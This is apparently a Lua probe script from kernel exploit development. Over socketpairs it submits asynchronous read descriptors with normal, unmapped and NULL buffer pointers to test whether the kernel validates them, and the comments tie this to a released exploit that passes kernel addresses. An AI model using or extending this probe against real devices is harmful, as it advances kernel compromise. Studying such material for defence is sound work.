-- CRASH_CLASS: LOW
-- PROBE 784a: does a submitted aio read use the descriptor's buffer pointer,
--            and is that pointer validated?
--
-- Context: 669(1, desc, 1, 3, id) is accepted (ret=0) and the request reaches
-- state 2 (in flight) and, when the peer is preloaded, state 3 (completed).
-- Nobody has yet checked whether the completed read actually lands in the
-- buffer named by the descriptor, or whether the worker validates that buffer
-- as a user address. The released exploit submits descriptors whose buffer
-- field is a kernel address, so this is the whole question.

print("=== PROBE 784a: AIO BUFFER SEMANTICS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function wd(a, v) memory.write_dword(a, v) end
local function wq(a, v) memory.write_qword(a, v) end
local function hx(v) return string.format("%08X", to_num(v) % 4294967296) end

local sink   = to_num(memory.alloc(0x8000))
local req    = to_num(memory.alloc(0x2000))
local ids    = to_num(memory.alloc(0x400))
local states = to_num(memory.alloc(0x400))
local idout  = to_num(memory.alloc(0x40))
local fds    = to_num(memory.alloc(64))
local wbuf   = to_num(memory.alloc(0x100))

for i = 0, 0x1FFF do wd(sink + i * 4, 0xCCCCCCCC) end
local PAT = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48 }
for i = 1, 8 do wd(wbuf + (i - 1) * 4, 0) end
for i = 1, 8 do memory.write_byte(wbuf + (i - 1), PAT[i]) end

local SOCKETPAIR, WRITE = 135, 4
local AIO_WAIT, AIO_POLL, AIO_SUBMIT = 663, 664, 669

local function dump(tag, addr, n)
    local parts = {}
    for i = 0, n - 1 do
        parts[#parts + 1] = string.format("%02X", to_num(memory.read_byte(addr + i)))
    end
    print(string.format("[%s] %s", tag, table.concat(parts, " ")))
end

local function pairsock()
    local r = sgn(make_syscall(SOCKETPAIR)(U(1), U(1), U(0), U(fds), Z, Z))
    if r ~= 0 then return nil, nil end
    return rd(fds), rd(fds + 4)
end

-- desc layout: +00 offset, +08 length, +10 buffer, +18 result, +20 fd dword, +24 flags
local function submit(slot, fd, buf, len, resptr)
    wq(req + slot * 0x40 + 0x00, Z)
    wq(req + slot * 0x40 + 0x08, U(len))
    wq(req + slot * 0x40 + 0x10, U(buf))
    wq(req + slot * 0x40 + 0x18, U(resptr or 0))
    wd(req + slot * 0x40 + 0x20, fd)
    wd(req + slot * 0x40 + 0x24, 0)
    local r = sgn(make_syscall(AIO_SUBMIT)(U(1), U(req + slot * 0x40), U(1), U(3), U(idout), Z))
    return r, rd(idout)
end

local function poll(id, outslot)
    wd(ids, id)
    wd(states, 0xDEADBEEF)
    local r = sgn(make_syscall(AIO_POLL)(U(ids), U(1), U(states), Z, Z, Z))
    return r, hx(rd(states)), outslot
end

-- [A] control: buffer at +0x10, peer preloaded
local rfd, wfd = pairsock()
print(string.format("[A] socketpair r=%s w=%s", tostring(rfd), tostring(wfd)))
if not rfd then return end
local wz = sgn(make_syscall(WRITE)(U(wfd), U(wbuf), U(8), Z, Z, Z))
print(string.format("[A0] preload write=%d", wz))
local sr, id = submit(0, rfd, sink, 8, sink + 0x4000)
wd(ids, id)
local pr, st = poll(id)
print(string.format("[A1] submit=%d id=%s poll=%d state=%s", sr, hx(id), pr, st))
dump("A2", sink, 16)
print(string.format("[A3] result dword=%s", hx(rd(sink + 0x4000))))

-- [B] same request but the buffer is an address we do not map.
-- If the worker validates the pointer this stays 2/none; if it does not, the
-- completion path itself is unchecked.
local rfd2, wfd2 = pairsock()
if rfd2 then
    local wz2 = sgn(make_syscall(WRITE)(U(wfd2), U(wbuf), U(8), Z, Z, Z))
    local sr2, id2 = submit(1, rfd2, 0x40000000, 8, sink + 0x4008)
    wd(ids, id2)
    local _, st2 = poll(id2)
    print(string.format("[B] unmapped buf: write=%d submit=%d id=%s state=%s res=%s",
        wz2, sr2, hx(id2), st2, hx(rd(sink + 0x4008))))
end

-- [C] buffer = NULL
local rfd3, wfd3 = pairsock()
if rfd3 then
    local wz3 = sgn(make_syscall(WRITE)(U(wfd3), U(wbuf), U(8), Z, Z, Z))
    local sr3, id3 = submit(2, rfd3, 0, 8, sink + 0x400C)
    wd(ids, id3)
    local _, st3 = poll(id3)
    print(string.format("[C] null buf: write=%d submit=%d id=%s state=%s res=%s",
        wz3, sr3, hx(id3), st3, hx(rd(sink + 0x400C))))
end

print("=== PROBE 784a DONE ===")
